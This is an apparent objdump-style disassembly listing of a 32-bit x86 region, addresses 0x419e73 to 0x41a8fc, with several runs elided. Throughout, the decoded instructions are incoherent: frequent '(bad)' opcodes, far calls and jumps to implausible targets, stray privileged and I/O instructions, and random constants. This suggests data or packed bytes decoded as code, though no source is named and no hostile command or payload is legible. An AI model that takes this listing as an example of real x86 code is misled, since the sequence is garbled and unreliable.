  419e73:	mov    ebx,0x6ddbf075
  419e78:	call   0x46d0:0x1dd24f71
  419e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e80:	stc    
  419e81:	or     bl,ch
  419e83:	cs ret 
  419e85:	and    eax,edx
  419e87:	cld    
  419e88:	repz sub eax,0x4198f8b6
  419e8e:	je     0x419ef6
  419e90:	repz inc edi
  419e92:	mov    ebp,0xc8ab2abf
  419e97:	(bad)  
  419e98:	in     al,0x4d
  419e9a:	inc    ebx
  419e9b:	mov    edx,0x6b90fdb1
  419ea0:	push   eax
  419ea1:	push   eax
  419ea2:	xchg   ecx,eax
  419ea3:	inc    edx
  419ea4:	jle    0x419ee5
  419ea6:	std    
  419ea7:	sub    DWORD PTR [ebx+0x2e],ebx
  419eaa:	or     al,0x8d
  419eac:	cld    
  419ead:	push   ss
  419eae:	popa   
  419eaf:	icebp  
  419eb0:	(bad)  
  419eb1:	sar    BYTE PTR [eax+0x4186903],1
  419eb7:	mov    ds:0xd4c10c28,eax
  419ebc:	jb     0x419e70
  419ebe:	fld    QWORD PTR [eax+0x234f]
	...
  419f34:	sbb    al,0x97
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx-0x3361f4b7]
  419f41:	push   ebp
  419f42:	jp     0x419fc3
  419f44:	jo     0x419f5f
  419f46:	add    DWORD PTR [eax],eax
  419f48:	test   BYTE PTR [eax],0x0
  419f4b:	add    BYTE PTR [ebx+0x23],dl
  419f4e:	iret   
  419f4f:	xchg   edi,eax
  419f50:	adc    BYTE PTR [ecx+0x4d8bb9],bl
  419f56:	enter  0xfbfd,0x1f
  419f5a:	pop    ebx
  419f5b:	fcmovbe st,st(1)
  419f5d:	das    
  419f5e:	cmp    BYTE PTR [eax+0x43],al
  419f61:	mov    dl,0x65
  419f63:	fdivr  QWORD PTR [esi-0x5f]
  419f66:	pop    edx
  419f67:	loop   0x419f08
  419f69:	ja     0x419f6e
  419f6b:	and    dh,BYTE PTR [edx]
  419f6d:	xchg   esp,eax
  419f6e:	rcr    dh,cl
  419f70:	cs ffreep st(6)
  419f73:	imul   ebx,DWORD PTR [eax*2-0xfef2096],0xe384d123
  419f7e:	jmp    0xd5574243
  419f83:	int3   
  419f84:	(bad)  
  419f85:	cli    
  419f86:	adc    ebp,DWORD PTR ds:0x3162a37
  419f8c:	mov    dl,0xfe
  419f8e:	mov    edx,0x250a6eae
  419f93:	cmp    al,0x49
  419f95:	add    dl,BYTE PTR [esp+eiz*2]
  419f98:	mov    ebp,0xec4a3c7a
  419f9d:	push   esi
  419f9e:	call   edi
  419fa0:	test   BYTE PTR [ebx],al
  419fa2:	sub    al,0x72
  419fa4:	mov    edx,0x754bbfe1
  419fa9:	sub    al,0x27
  419fab:	xchg   ebp,eax
  419fac:	stos   BYTE PTR es:[edi],al
  419fad:	sub    DWORD PTR [ebx+ebx*1+0x36],edx
  419fb1:	outs   dx,DWORD PTR ds:[esi]
  419fb2:	pop    ebp
  419fb3:	stos   BYTE PTR es:[edi],al
  419fb4:	jns    0x419fdf
  419fb6:	dec    ecx
  419fb7:	ret    0x7c9
  419fba:	inc    eax
  419fbb:	repz mov bl,0x84
  419fbe:	addr16 xor al,0x36
  419fc1:	fisub  WORD PTR [esi-0x4627c26b]
  419fc8:	ja     0x41a031
  419fca:	cmp    BYTE PTR [ecx],al
  419fcc:	adc    al,0xdf
  419fce:	ret    0x9d32
  419fd1:	xor    eax,ebx
  419fd3:	xchg   ebx,eax
  419fd4:	cli    
  419fd5:	pop    ss
  419fd6:	(bad)  
  419fd7:	call   0x7176:0xc19b79ec
  419fde:	outs   dx,DWORD PTR ds:[esi]
  419fdf:	pushf  
  419fe0:	jo     0x41a025
  419fe2:	mov    esp,0xe92987f
  419fe7:	and    eax,0x3088da08
  419fec:	push   cs
  419fed:	add    DWORD PTR [eax],edi
  419fef:	push   es
  419ff0:	dec    edx
  419ff1:	lahf   
  419ff2:	or     DWORD PTR [esi+ebx*2],0x5349edf9
  419ff9:	ja     0x419f8f
  419ffb:	mov    cl,0x8b
  419ffd:	jne    0x419fc7
  419fff:	(bad)  
  41a000:	sar    dl,1
  41a002:	or     ah,BYTE PTR [edx]
  41a004:	jmp    0x92d2a59d
  41a009:	mov    eax,ds:0x6df3ab71
  41a00e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a00f:	jnp    0x419ffb
  41a011:	imul   eax,esp,0xe1118a2f
  41a017:	ins    DWORD PTR es:[edi],dx
  41a018:	test   eax,0xceff0973
  41a01d:	jge    0x41a027
  41a01f:	(bad)  [edx+0x4bcc6a46]
  41a025:	cdq    
  41a026:	pop    ecx
  41a027:	std    
  41a028:	sbb    eax,0x5612d988
  41a02d:	or     BYTE PTR [eax],bh
  41a02f:	dec    eax
  41a030:	xor    eax,0x8429f9c2
  41a035:	in     al,0x70
  41a037:	retf   0x7b7
  41a03a:	loope  0x419fc0
  41a03c:	inc    ecx
  41a03d:	sub    eax,DWORD PTR es:[edi+0x4e2b]
	...
  41a0b4:	scas   eax,DWORD PTR es:[edi]
  41a0b5:	test   DWORD PTR [esi-0xa441be],ebx
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0x5b8504a2
  41a0c2:	shr    ebp,1
  41a0c4:	data16 sbb al,BYTE PTR [ecx]
  41a0c7:	add    dh,dh
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	add    BYTE PTR [edx],bh
  41a0cd:	or     cl,al
  41a0cf:	mov    ebp,edx
  41a0d1:	and    eax,0xdedb1930
  41a0d6:	inc    ebx
  41a0d7:	pushf  
  41a0d8:	adc    al,bh
  41a0da:	sbb    al,0xb9
  41a0dc:	ja     0x41a115
  41a0de:	push   esi
  41a0df:	inc    ecx
  41a0e0:	add    ch,cl
  41a0e2:	out    0x72,al
  41a0e4:	mov    edi,0x69e55d87
  41a0e9:	das    
  41a0ea:	scas   al,BYTE PTR es:[edi]
  41a0eb:	mov    dh,0xcc
  41a0ed:	mov    dl,0xb6
  41a0ef:	mov    eax,0x45e4a954
  41a0f4:	lods   al,BYTE PTR ds:[esi]
  41a0f5:	sub    BYTE PTR [esi],ah
  41a0f7:	test   BYTE PTR [ebx],ah
  41a0f9:	xchg   DWORD PTR [eax+0x67],ebx
  41a0fc:	stos   DWORD PTR es:[edi],eax
  41a0fd:	jecxz  0x41a12d
  41a0ff:	dec    eax
  41a100:	cmp    ecx,DWORD PTR [eax-0x75]
  41a103:	add    DWORD PTR [eax-0x49],ecx
  41a106:	cmp    ebp,DWORD PTR [edx-0x73]
  41a109:	mov    esi,0x3dafb5ee
  41a10e:	aas    
  41a10f:	test   ch,al
  41a111:	arpl   ax,cx
  41a113:	(bad)  
  41a114:	and    eax,0x14efd6d
  41a119:	mov    DWORD PTR [edi],edi
  41a11b:	mov    ah,0x46
  41a11d:	xchg   esp,eax
  41a11e:	sti    
  41a11f:	call   0x496eb276
  41a124:	repnz pop edx
  41a126:	jle    0x41a10b
  41a128:	popf   
  41a129:	push   es
  41a12a:	repnz loope 0x41a0fb
  41a12d:	retf   
  41a12e:	and    ebp,DWORD PTR [ebp+0x7f]
  41a131:	sti    
  41a132:	in     eax,0x23
  41a134:	loop   0x41a142
  41a136:	xor    ah,BYTE PTR [ebx-0x52061fb0]
  41a13c:	fld    DWORD PTR [edi-0x4faf3eaf]
  41a142:	xchg   edx,eax
  41a143:	adc    ah,bl
  41a145:	pop    edx
  41a146:	aaa    
  41a147:	xchg   ebp,eax
  41a148:	rol    DWORD PTR [esi],0x7b
  41a14b:	jae    0x41a13c
  41a14d:	repnz add al,0x9a
  41a150:	(bad)  
  41a151:	jb     0x41a120
  41a153:	jmp    0x1cf6fc21
  41a158:	or     al,0xc4
  41a15a:	mov    dh,0x70
  41a15c:	retf   
  41a15d:	lods   al,BYTE PTR ds:[esi]
  41a15e:	or     DWORD PTR [edx],esi
  41a160:	into   
  41a161:	push   edx
  41a162:	or     DWORD PTR [eax],esp
  41a164:	out    dx,al
  41a165:	outs   dx,DWORD PTR ds:[esi]
  41a166:	xchg   DWORD PTR [ecx-0x72],edi
  41a169:	xor    edx,esp
  41a16b:	inc    edi
  41a16c:	add    ebp,esi
  41a16e:	and    eax,0xd0c8e01
  41a173:	mov    ebp,DWORD PTR [ecx]
  41a175:	xchg   DWORD PTR [edi+ecx*1],ecx
  41a178:	mov    ds:0xc85b45af,al
  41a17d:	or     edx,ebp
  41a17f:	retf   0x9c44
  41a182:	dec    ebp
  41a183:	sahf   
  41a184:	mov    ecx,0xf50f7f86
  41a189:	ror    BYTE PTR [edx+0x39a5392b],cl
  41a18f:	or     dl,BYTE PTR [ecx+0x89f0ecf]
  41a195:	repz ficomp WORD PTR [ebx+0x35c34c88]
  41a19c:	mov    dl,0x52
  41a19e:	add    ah,bl
  41a1a0:	dec    edi
  41a1a1:	or     ebp,ecx
  41a1a3:	jne    0x41a1a7
  41a1a5:	lea    ebp,[eax+eiz*8-0x6077b3d3]
  41a1ac:	mov    ecx,0xd2ae2ef5
  41a1b1:	imul   DWORD PTR [edi]
  41a1b3:	pop    ebx
  41a1b4:	and    bh,bh
  41a1b6:	aad    0xcd
  41a1b8:	jecxz  0x41a189
  41a1ba:	or     esi,DWORD PTR [edx]
  41a1bc:	inc    ecx
  41a1bd:	mov    cl,0x5f
  41a1bf:	clc    
  41a1c0:	or     al,BYTE PTR gs:[eax]
	...
  41a233:	add    BYTE PTR [eax-0xcc4519],ah
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	div    BYTE PTR [edx+0x5c825a62]
  41a245:	sbb    eax,DWORD PTR [ecx]
  41a247:	add    dh,dh
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    bl,bl
  41a24d:	popa   
  41a24e:	nop
  41a24f:	lahf   
  41a250:	cmc    
  41a251:	ret    
  41a252:	add    al,BYTE PTR [edi+0x30]
  41a255:	aam    0x14
  41a257:	push   ebx
  41a258:	in     eax,dx
  41a259:	lock ins BYTE PTR es:[edi],dx
  41a25b:	mov    eax,ds:0x36565e5a
  41a260:	adc    eax,0x59a16da
  41a265:	(bad)  
  41a266:	jmp    0x5c65f09d
  41a26b:	fild   WORD PTR [eax]
  41a26d:	and    al,0xc1
  41a26f:	xchg   edx,eax
  41a270:	test   ebx,edi
  41a272:	retf   0x59ed
  41a275:	inc    esi
  41a276:	jge    0x41a285
  41a278:	jo     0x41a211
  41a27a:	and    eax,0x3dd51403
  41a27f:	arpl   WORD PTR [eax-0x69],bp
  41a282:	mov    bh,0x4c
  41a284:	pushf  
  41a285:	aam    0x1c
  41a287:	mov    BYTE PTR [esi],ah
  41a289:	bound  ebp,QWORD PTR [ecx]
  41a28b:	out    0x2,eax
  41a28d:	enter  0x5d80,0xcd
  41a291:	int3   
  41a292:	mov    fs,WORD PTR [esi+0x20430ef9]
  41a298:	inc    esp
  41a299:	je     0x41a2d3
  41a29b:	adc    al,0xc8
  41a29d:	push   cs
  41a29e:	cmp    al,0x44
  41a2a0:	xchg   esp,eax
  41a2a1:	jnp    0x41a266
  41a2a3:	or     dl,BYTE PTR [ecx+eax*2-0x3321242]
  41a2aa:	jge    0x41a2d4
  41a2ac:	pop    ebx
  41a2ad:	mov    ebp,0xf0002f7a
  41a2b2:	mov    edi,0xf6f9693c
  41a2b7:	bound  esi,QWORD PTR [ecx+esi*2+0x9539fae]
  41a2be:	adc    DWORD PTR [ecx],esp
  41a2c0:	push   ebp
  41a2c1:	(bad)  
  41a2c2:	push   esi
  41a2c3:	nop
  41a2c4:	sub    edx,DWORD PTR [edx-0xa]
  41a2c7:	outs   dx,BYTE PTR ds:[esi]
  41a2c8:	and    eax,0x5254a3e0
  41a2cd:	aas    
  41a2ce:	inc    ebx
  41a2cf:	pop    ebx
  41a2d0:	fdivr  DWORD PTR [esi+ebp*4-0x51]
  41a2d4:	lock fldcw WORD PTR [ebx+0x4be35c7f]
  41a2db:	clc    
  41a2dc:	jne    0x41a2e7
  41a2de:	mov    ecx,0x5963c83
  41a2e3:	push   ds
  41a2e4:	dec    eax
  41a2e5:	sbb    al,0xea
  41a2e7:	lods   al,BYTE PTR ds:[esi]
  41a2e8:	ret    0xee6e
  41a2eb:	icebp  
  41a2ec:	sub    al,dl
  41a2ee:	inc    ebp
  41a2ef:	js     0x41a301
  41a2f1:	in     eax,dx
  41a2f2:	jmp    0x41a274
  41a2f4:	sbb    bh,BYTE PTR [ecx-0x41]
  41a2f7:	jmp    0xd981:0xd32618ae
  41a2fe:	stos   BYTE PTR es:[edi],al
  41a2ff:	scas   al,BYTE PTR es:[edi]
  41a300:	loopne 0x41a29f
  41a302:	jo     0x41a2c4
  41a304:	pop    ebp
  41a305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a306:	in     al,dx
  41a307:	and    bh,BYTE PTR ds:0x2f0da510
  41a30d:	inc    esi
  41a30e:	jb     0x41a372
  41a310:	pop    ecx
  41a311:	add    eax,0x1988e8c8
  41a316:	cmp    al,0xc2
  41a318:	push   ecx
  41a319:	add    ah,ah
  41a31b:	mov    WORD PTR [edi+0x6959308],?
  41a321:	mov    ds:0x7b4574ee,al
  41a326:	cmp    BYTE PTR [eax],bh
  41a328:	pop    es
  41a329:	pop    es
  41a32a:	push   edi
  41a32b:	xor    dh,bh
  41a32d:	int    0x91
  41a32f:	xchg   DWORD PTR [esi+edx*8],esp
  41a332:	div    BYTE PTR [edx-0x65]
  41a335:	mov    DWORD PTR [edi+ebp*4+0x3a],ecx
  41a339:	add    ebp,eax
  41a33b:	mov    dl,dl
  41a33d:	lea    eax,[edi+0x30288d]
	...
  41a3b3:	add    BYTE PTR ds:0xed3a6998,bh
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	or     al,0xb8
  41a3c2:	rol    BYTE PTR [edx],0x52
  41a3c5:	sbb    al,0x1
  41a3c7:	add    dh,dh
  41a3c9:	add    BYTE PTR [eax],al
  41a3cb:	add    BYTE PTR [esi+0x45],cl
  41a3ce:	retf   
  41a3cf:	jle    0x41a3b6
  41a3d1:	jbe    0x41a371
  41a3d3:	sbb    cl,bl
  41a3d5:	loop   0x41a445
  41a3d7:	or     ecx,DWORD PTR [edi-0x4d]
  41a3da:	jne    0x41a39b
  41a3dc:	pop    edx
  41a3dd:	jbe    0x41a376
  41a3df:	lea    esi,[edi]
  41a3e1:	jp     0x41a3f3
  41a3e3:	jno    0x41a37b
  41a3e5:	loop   0x41a369
  41a3e7:	and    esi,DWORD PTR [esi-0x6]
  41a3ea:	std    
  41a3eb:	clc    
  41a3ec:	js     0x41a40f
  41a3ee:	repnz (bad) 
  41a3f0:	or     DWORD PTR ss:[ecx+0x26],0xfffffff0
  41a3f5:	dec    ecx
  41a3f6:	idiv   DWORD PTR [edx+edi*2]
  41a3f9:	sbb    al,0xa6
  41a3fb:	icebp  
  41a3fc:	int    0xef
  41a3fe:	fbld   TBYTE PTR [ebp+0x75]
  41a401:	jnp    0x41a38f
  41a403:	xchg   edx,eax
  41a404:	push   edi
  41a405:	stos   BYTE PTR es:[edi],al
  41a406:	xchg   edi,eax
  41a407:	std    
  41a408:	iret   
  41a409:	in     eax,dx
  41a40a:	adc    al,al
  41a40c:	stos   DWORD PTR es:[edi],eax
  41a40d:	das    
  41a40e:	loop   0x41a3ba
  41a410:	xor    eax,DWORD PTR [esi]
  41a412:	dec    ebx
  41a413:	push   es
  41a414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a415:	out    0x55,eax
  41a417:	les    ecx,FWORD PTR [edx-0x1d]
  41a41a:	lods   al,BYTE PTR ds:[esi]
  41a41b:	shl    BYTE PTR [eax+0x5670caef],cl
  41a421:	icebp  
  41a422:	mov    esp,DWORD PTR [ebx+0x11]
  41a425:	repz xor BYTE PTR [ecx+0x7c],0xc1
  41a42a:	sbb    esp,DWORD PTR [edx-0x7a38b94b]
  41a430:	syscall 
  41a432:	xchg   ebp,eax
  41a433:	(bad)  
  41a434:	xchg   edi,eax
  41a435:	into   
  41a436:	mov    WORD PTR [ebp+0x71fa0c57],?
  41a43c:	mov    edx,0xbff785c2
  41a441:	dec    ecx
  41a442:	aaa    
  41a443:	and    eax,0x326c5f4e
  41a448:	mov    ds:0xb24f614d,eax
  41a44d:	mov    al,ds:0x1ee3cc2
  41a452:	jle    0x41a439
  41a454:	cwde   
  41a455:	ins    DWORD PTR es:[edi],dx
  41a456:	out    0xd1,al
  41a458:	lds    esp,FWORD PTR [esi]
  41a45a:	or     ch,bh
  41a45c:	xchg   edx,eax
  41a45d:	daa    
  41a45e:	dec    edx
  41a45f:	call   0x306ae060
  41a464:	pop    edi
  41a465:	pop    edx
  41a466:	or     DWORD PTR ds:0xb1f1113,ecx
  41a46c:	aas    
  41a46d:	fild   DWORD PTR [esi-0x53293a13]
  41a473:	retf   0xc734
  41a476:	mov    eax,ds:0x514b4522
  41a47b:	loop   0x41a42a
  41a47d:	pop    DWORD PTR [ecx+0x7c063770]
  41a483:	ss mov edi,0x4c0dc6b1
  41a489:	pop    edi
  41a48a:	les    ecx,FWORD PTR es:[edx]
  41a48d:	js     0x41a41f
  41a48f:	cs jbe 0x41a45c
  41a492:	aas    
  41a493:	fisub  WORD PTR [ecx-0x75]
  41a496:	adc    eax,0x2cfcc5b5
  41a49b:	jae    0x41a480
  41a49d:	push   eax
  41a49e:	sub    ah,dl
  41a4a0:	mov    eax,DWORD PTR ds:0x5c5d824f
  41a4a6:	rcl    DWORD PTR [ecx],0x94
  41a4a9:	imul   ebx,edi,0xde498919
  41a4af:	data16 int3 
  41a4b1:	lahf   
  41a4b2:	pop    DWORD PTR [edi-0x3d]
  41a4b5:	jb     0x41a46d
  41a4b7:	rol    DWORD PTR [edx-0x40],0xc5
  41a4bb:	(bad)  
  41a4bc:	aad    0x91
  41a4be:	adc    BYTE PTR [esi+eiz*4],al
  41a4c1:	test   BYTE PTR [eax],al
	...
  41a533:	add    BYTE PTR [edi-0x9d722c],ch
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax-0x1d161f56]
  41a541:	dec    esi
  41a542:	test   BYTE PTR [edx],bh
  41a544:	dec    eax
  41a545:	sbb    eax,0xf60001
  41a54a:	add    BYTE PTR [eax],al
  41a54c:	out    dx,al
  41a54d:	mov    DWORD PTR [edi-0x31],eax
  41a550:	addr16 mov eax,ds:0xdd5a
  41a554:	and    bh,dl
  41a556:	inc    ebp
  41a557:	mov    dh,0x7
  41a559:	pusha  
  41a55a:	js     0x41a5ca
  41a55c:	sub    esp,ecx
  41a55e:	jmp    0x9335:0x886efaa7
  41a565:	and    al,0x44
  41a567:	inc    ecx
  41a568:	jno    0x41a5d5
  41a56a:	jmp    0x588f:0x28da7137
  41a571:	dec    ebp
  41a572:	sbb    al,0x1a
  41a574:	mov    esp,0xd84c70cb
  41a579:	xor    bh,bh
  41a57b:	popa   
  41a57c:	or     DWORD PTR [edx+0x2a12099a],ebp
  41a582:	mov    esi,0xb03c475c
  41a587:	sti    
  41a588:	jmp    0x8c0d:0x93c2bc39
  41a58f:	and    dl,bh
  41a591:	aaa    
  41a592:	fwait
  41a593:	cmp    eax,DWORD PTR [eax-0x7cc149ed]
  41a599:	les    esp,FWORD PTR [eax]
  41a59b:	jmp    0x41a56e
  41a59d:	out    0x26,eax
  41a59f:	das    
  41a5a0:	scas   al,BYTE PTR es:[edi]
  41a5a1:	fldenv [edx]
  41a5a3:	(bad)  
  41a5a4:	push   esi
  41a5a5:	in     eax,dx
  41a5a6:	mov    edi,0xdc2d5c48
  41a5ab:	cmp    BYTE PTR [esi],ah
  41a5ad:	mov    ds:0xd3cfa74c,al
  41a5b2:	and    DWORD PTR [ecx],esp
  41a5b4:	scas   eax,DWORD PTR es:[edi]
  41a5b5:	add    BYTE PTR [eax-0x5f581cd5],bl
  41a5bb:	and    eax,0xd74f0c2e
  41a5c0:	or     eax,0xa1c15578
  41a5c5:	cmc    
  41a5c6:	add    eax,0x9a1d1aeb
  41a5cb:	push   0x67
  41a5cd:	mov    eax,0x22c63f82
  41a5d2:	xchg   ecx,esi
  41a5d4:	pop    ecx
  41a5d5:	repnz add eax,0x906141e
  41a5db:	pop    edx
  41a5dc:	call   0x7faebd1e
  41a5e1:	loopne 0x41a643
  41a5e3:	sbb    BYTE PTR [ebx-0x46],dl
  41a5e6:	and    BYTE PTR [ebp+0xdd26ef4],ch
  41a5ec:	in     eax,dx
  41a5ed:	in     eax,0x40
  41a5ef:	aad    0xfa
  41a5f1:	je     0x41a5a4
  41a5f3:	shl    DWORD PTR [ecx],0x2b
  41a5f6:	dec    edi
  41a5f7:	xor    eax,0x6ea960a5
  41a5fc:	or     al,0x9f
  41a5fe:	inc    edi
  41a5ff:	jge    0x41a61a
  41a601:	jnp    0x41a5ad
  41a603:	jno    0x41a654
  41a605:	fcom   st(0)
  41a607:	test   BYTE PTR [ecx],bh
  41a609:	fcmovnu st,st(3)
  41a60b:	bound  esi,QWORD PTR [edi-0x576fad46]
  41a611:	inc    BYTE PTR [ebx-0x468d08f0]
  41a617:	mov    dl,BYTE PTR [edi]
  41a619:	fsub   QWORD PTR ds:0xdd3d2b19
  41a61f:	dec    esp
  41a620:	xchg   edx,eax
  41a621:	inc    ebp
  41a622:	hlt    
  41a623:	loopne 0x41a63f
  41a625:	js     0x41a61d
  41a627:	gs lahf 
  41a629:	xchg   esi,eax
  41a62a:	scas   al,BYTE PTR es:[edi]
  41a62b:	add    ah,bh
  41a62d:	jp     0x41a5dc
  41a62f:	pop    edx
  41a630:	les    ebp,FWORD PTR [edx+0x11]
  41a633:	(bad)  
  41a634:	scas   al,BYTE PTR es:[edi]
  41a635:	std    
  41a636:	call   0x553ff9c3
  41a63b:	fstp   st(3)
  41a63d:	and    edx,DWORD PTR [esi+0x10]
  41a640:	into   
  41a641:	adc    DWORD PTR [eax],eax
	...
  41a6b3:	add    BYTE PTR [ebx-0x29a8ec1],dh
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0x4c
  41a6c1:	inc    ecx
  41a6c2:	fidivr WORD PTR [edi+0x11e3e]
  41a6c8:	test   BYTE PTR [eax],0x0
  41a6cb:	add    BYTE PTR [ebp+0x3c],cl
  41a6ce:	push   ds
  41a6cf:	cmp    DWORD PTR [ebx+0xa],eax
  41a6d2:	loope  0x41a703
  41a6d4:	test   al,0xf2
  41a6d6:	sbb    al,0x43
  41a6d8:	add    edx,0xa7ac287f
  41a6de:	dec    ebx
  41a6df:	or     BYTE PTR [edi-0x72b6b1ac],cl
  41a6e5:	sbb    ah,BYTE PTR ds:0x470cd729
  41a6eb:	call   0xf3d65ec5
  41a6f0:	hlt    
  41a6f1:	dec    eax
  41a6f2:	push   eax
  41a6f3:	jge    0x41a6b9
  41a6f5:	jno    0x41a750
  41a6f7:	out    dx,al
  41a6f8:	outs   dx,DWORD PTR ds:[esi]
  41a6f9:	jmp    0x5cf95d7d
  41a6fe:	sub    bl,bl
  41a700:	or     dl,dl
  41a702:	fmul   QWORD PTR [ecx-0x37edbc05]
  41a708:	mov    bl,0x8a
  41a70a:	test   al,0xb8
  41a70c:	mov    esi,0x21fdeffa
  41a711:	repnz adc ebx,DWORD PTR [esi]
  41a714:	push   edi
  41a715:	loop   0x41a706
  41a717:	cmc    
  41a718:	jns    0x41a6fd
  41a71a:	arpl   WORD PTR [ebx-0x100991c7],bx
  41a720:	pop    ebp
  41a721:	sti    
  41a722:	call   0x1d0:0xf54d3eea
  41a729:	in     eax,dx
  41a72a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a72b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a72c:	cmp    ah,BYTE PTR gs:[ebx+0x4f]
  41a730:	sub    BYTE PTR [edi],ch
  41a732:	xchg   BYTE PTR [esi+0x52],bl
  41a735:	cmp    esi,DWORD PTR [esi+0xa]
  41a738:	push   esp
  41a739:	push   0xffffffc1
  41a73b:	or     al,0x67
  41a73d:	sti    
  41a73e:	cmp    DWORD PTR [eax-0x7e],esp
  41a741:	cmc    
  41a742:	sbb    bl,bl
  41a744:	ins    DWORD PTR es:[edi],dx
  41a745:	leave  
  41a746:	int    0x38
  41a748:	aam    0x47
  41a74a:	pop    ds
  41a74b:	or     eax,0xe29b019
  41a750:	jecxz  0x41a733
  41a752:	stos   DWORD PTR es:[edi],eax
  41a753:	sub    eax,0x80c89cf0
  41a758:	ror    DWORD PTR [ecx+0x57],0x81
  41a75c:	loope  0x41a77f
  41a75e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a75f:	mov    ebx,0xacaf2076
  41a764:	jne    0x41a743
  41a766:	push   cs
  41a767:	push   ds
  41a768:	dec    esp
  41a769:	or     esp,DWORD PTR [edi]
  41a76b:	mov    eax,ds:0x23698b6f
  41a770:	test   DWORD PTR [ecx+0x5a],ecx
  41a773:	jae    0x41a738
  41a775:	pop    esp
  41a776:	outs   dx,DWORD PTR gs:[esi]
  41a778:	xlat   BYTE PTR ds:[ebx]
  41a779:	push   esi
  41a77a:	out    0x9f,al
  41a77c:	jns    0x41a7e3
  41a77e:	ins    BYTE PTR es:[edi],dx
  41a77f:	bound  edi,QWORD PTR [edi-0x5f]
  41a782:	xchg   ecx,eax
  41a783:	xor    edx,DWORD PTR [ebp+edx*8+0x2d]
  41a787:	and    al,0xd4
  41a789:	inc    eax
  41a78a:	(bad)  
  41a78b:	jmp    0x7d1731de
  41a790:	or     al,0x63
  41a792:	test   al,0x37
  41a794:	and    dl,BYTE PTR [esi+0x2c]
  41a797:	xor    edx,DWORD PTR [edx+eax*8-0x3077be7f]
  41a79e:	push   cs
  41a79f:	push   ecx
  41a7a1:	adc    al,0x9b
  41a7a3:	bound  edx,QWORD PTR [ebp+0x68728a00]
  41a7a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7aa:	xor    al,0xed
  41a7ac:	rcr    BYTE PTR [eax],0x8a
  41a7af:	xor    eax,0x2a65b094
  41a7b4:	sbb    bh,ch
  41a7b6:	sbb    esi,DWORD PTR [eax]
  41a7b8:	mov    ch,0xf
  41a7ba:	ror    dl,1
  41a7bc:	in     eax,dx
  41a7bd:	add    eax,0x417ed78c
	...
  41a832:	add    BYTE PTR [eax],al
  41a834:	sbb    BYTE PTR [ecx],0x47
  41a837:	loope  0x41a818
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a845
  41a841:	out    dx,eax
  41a842:	jmp    0x41a826
  41a844:	xor    al,0x1f
  41a846:	add    DWORD PTR [eax],eax
  41a848:	test   BYTE PTR [eax],0x0
  41a84b:	add    ch,al
  41a84d:	cmp    dl,BYTE PTR [ecx-0x66]
  41a850:	pushf  
  41a851:	sub    al,0x68
  41a853:	enter  0x9548,0xe6
  41a857:	out    0x27,eax
  41a859:	fstp   TBYTE PTR [eax]
  41a85b:	jge    0x41a8b6
  41a85d:	retf   0xf9dc
  41a860:	rcl    BYTE PTR [esi],1
  41a862:	pushf  
  41a863:	jne    0x41a8ac
  41a865:	gs push ecx
  41a867:	sub    al,0x56
  41a869:	sub    eax,0x519f051
  41a86e:	fs (bad) 
  41a870:	pop    esi
  41a871:	or     DWORD PTR [esi],0x49b87a2
  41a877:	lock sbb ebp,DWORD PTR [ebp-0x2c]
  41a87b:	and    eax,0x51ac1adf
  41a880:	ret    
  41a881:	sahf   
  41a882:	push   0xffffffcd
  41a884:	mov    ds:0xc290d66,al
  41a889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a88a:	test   DWORD PTR [ebp+0x223e0f61],0x81220015
  41a894:	aaa    
  41a895:	jnp    0x41a8ac
  41a897:	pop    edi
  41a898:	sahf   
  41a899:	out    0xf6,eax
  41a89b:	jae    0x41a8ba
  41a89d:	push   esi
  41a89e:	add    cl,bh
  41a8a0:	cmp    DWORD PTR [esi-0x11],0xffffff90
  41a8a4:	cdq    
  41a8a5:	inc    edx
  41a8a6:	push   ebp
  41a8a7:	mov    ecx,0x6ef25006
  41a8ac:	jl     0x41a832
  41a8ae:	xor    BYTE PTR [ebp+edi*1-0x2eb94a25],ah
  41a8b5:	xchg   edi,eax
  41a8b6:	loopne 0x41a926
  41a8b8:	mov    dl,0x61
  41a8ba:	je     0x41a859
  41a8bc:	cdq    
  41a8bd:	inc    edi
  41a8be:	(bad)  
  41a8bf:	mov    bl,0xa5
  41a8c1:	retf   0xb6cf
  41a8c4:	xchg   DWORD PTR [ebx-0x3cac1018],ebp
  41a8ca:	sub    edi,DWORD PTR [eax]
  41a8cc:	setb   BYTE PTR [eax-0x2107c6ac]
  41a8d3:	push   esp
  41a8d4:	xor    al,0xb8
  41a8d6:	xchg   esp,eax
  41a8d7:	cdq    
  41a8d8:	xchg   BYTE PTR [edi+0xcd71216],cl
  41a8de:	cmp    edi,DWORD PTR [ebx+ebx*8+0x67]
  41a8e2:	ds mov ecx,0xe0ac3ad8
  41a8e8:	push   0xb0065410
  41a8ed:	xchg   esi,eax
  41a8ee:	adc    ch,BYTE PTR [eax]
  41a8f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8f1:	call   0xb6ce:0xfc9e7194
  41a8f8:	xlat   BYTE PTR ds:[ebx]
  41a8f9:	pop    ss
  41a8fa:	dec    edx
  41a8fb:	(bad)  
  41a8fc:	xor    bl,BYTE PTR [ebp+0x2]
